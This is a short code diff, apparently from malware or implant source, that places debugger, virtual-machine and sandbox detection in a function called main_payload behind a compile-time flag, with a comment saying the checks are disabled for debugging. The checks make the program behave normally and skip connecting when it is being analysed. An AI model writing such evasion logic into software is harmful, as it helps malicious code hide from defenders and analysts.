@@ -33,11 +33,13 @@ int main_payload(void) {
     uint32_t seed = get_tick_count() ^ get_process_id();
     set_random_seed(seed);
     
-    // Anti-analysis checks
+    // Anti-analysis checks (disabled for debugging)
+    #ifdef ENABLE_ANTI_ANALYSIS
     if (detect_debugger() || detect_vm() || detect_sandbox()) {
         // If detected, act normally but don't connect
         return 0;
     }
+    #endif
     
     // Initialize networking
     if (socket_init() != ERR_SUCCESS) {
